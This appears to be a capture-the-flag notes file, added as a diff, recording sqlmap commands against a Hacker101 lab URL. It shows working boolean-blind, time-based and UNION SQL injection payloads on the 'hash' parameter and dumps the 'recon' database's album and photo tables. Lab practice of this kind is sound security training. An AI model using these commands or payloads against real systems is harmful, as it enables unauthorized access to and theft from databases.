@@ -1,0 +1,101 @@
+- sqlmap -u "https://06642b6f1ecb637de0b6215d28220e51.ctf.hacker101.com/r3c0n_server_4fdk59/album/?hash=jdh34k" --dbs
+
+sqlmap identified the following injection point(s) with a total of 81 HTTP(s) requests:
+---
+Parameter: hash (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: hash=jdh34k' AND 7847=7847 AND 'UsSm'='UsSm
+
+    Type: time-based blind
+    Title: MySQL > 5.0.12 AND time-based blind (heavy query)
+    Payload: hash=jdh34k' AND 5895=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS A, INFORMATION_SCHEMA.COLUMNS B, INFORMATION_SCHEMA.COLUMNS C) AND 'wzzM'='wzzM
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: hash=-9410' UNION ALL SELECT NULL,NULL,CONCAT(0x716a6a7671,0x4b446e565879654768486d49574f6c52627075745373684e63476955427049546e6a447779476451,0x7176707071)-- -
+---
+[16:14:51] [INFO] the back-end DBMS is MySQL
+web application technology: OpenResty 1.21.4.1
+back-end DBMS: MySQL > 5.0.12
+[16:14:54] [INFO] fetching database names
+available databases [2]:
+[*] information_schema
+[*] recon
+
+[16:14:55] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 67 times
+[16:14:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/06642b6f1ecb637de0b6215d28220e51.ctf.hacker101.com'
+
+- sqlmap -u "https://06642b6f1ecb637de0b6215d28220e51.ctf.hacker101.com/r3c0n_server_4fdk59/album/?hash=jdh34k" --tables -D recon
+
+[16:22:25] [INFO] the back-end DBMS is MySQL
+web application technology: OpenResty 1.21.4.1
+back-end DBMS: MySQL > 5.0.12
+[16:22:25] [INFO] fetching tables for database: 'recon'
+Database: recon
+[2 tables]
++-------+
+| album |
+| photo |
++-------+
+
+[16:22:26] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/06642b6f1ecb637de0b6215d28220e51.ctf.hacker101.com'
+
+- sqlmap -u "https://06642b6f1ecb637de0b6215d28220e51.ctf.hacker101.com/r3c0n_server_4fdk59/album/?hash=jdh34k" --columns -D recon -T album
+
+[16:23:10] [INFO] fetching columns for table 'album' in database 'recon'
+Database: recon
+Table: album
+[3 columns]
++--------+--------------+
+| Column | Type         |
++--------+--------------+
+| hash   | varchar(6)   |
+| id     | int          |
+| name   | varchar(250) |
++--------+--------------+
+
+[16:23:11] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/06642b6f1ecb637de0b6215d28220e51.ctf.hacker101.com'
+
+- sqlmap -u "https://06642b6f1ecb637de0b6215d28220e51.ctf.hacker101.com/r3c0n_server_4fdk59/album/?hash=jdh34k" --columns -D recon -T photo
+
+[16:24:22] [INFO] the back-end DBMS is MySQL
+web application technology: OpenResty 1.21.4.1
+back-end DBMS: MySQL > 5.0.12
+[16:24:22] [INFO] fetching columns for table 'photo' in database 'recon'
+Database: recon
+Table: photo
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| album_id | int         |
+| id       | int         |
+| photo    | varchar(50) |
++----------+-------------+
+
+[16:24:23] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/06642b6f1ecb637de0b6215d28220e51.ctf.hacker101.com'
+
+- sqlmap -u "https://06642b6f1ecb637de0b6215d28220e51.ctf.hacker101.com/r3c0n_server_4fdk59/album/?hash=jdh34k" --dump -D recon -T photo
+
++----+----------+--------------------------------------+
+| id | album_id | photo                                |
++----+----------+--------------------------------------+
+| 1  | 1        | 0a382c6177b04386e1a45ceeaa812e4e.jpg |
+| 2  | 1        | 1254314b8292b8f790862d63fa5dce8f.jpg |
+| 3  | 2        | 32febb19572b12435a6a390c08e8d3da.jpg |
+| 4  | 3        | db507bdb186d33a719eb045603020cec.jpg |
+| 5  | 3        | 9b881af8b32ff07f6daada95ff70dc3a.jpg |
+| 6  | 3        | 13d74554c30e1069714a5a9edda8c94d.jpg |
++----+----------+--------------------------------------+
+
+- sqlmap -u "https://06642b6f1ecb637de0b6215d28220e51.ctf.hacker101.com/r3c0n_server_4fdk59/album/?hash=jdh34k" --dump -D recon -T album
+
++----+--------+-----------+
+| id | hash   | name      |
++----+--------+-----------+
+| 1  | 3dir42 | Xmas 2018 |
+| 2  | 59grop | Xmas 2019 |
+| 3  | jdh34k | Xmas 2020 |
++----+--------+-----------+
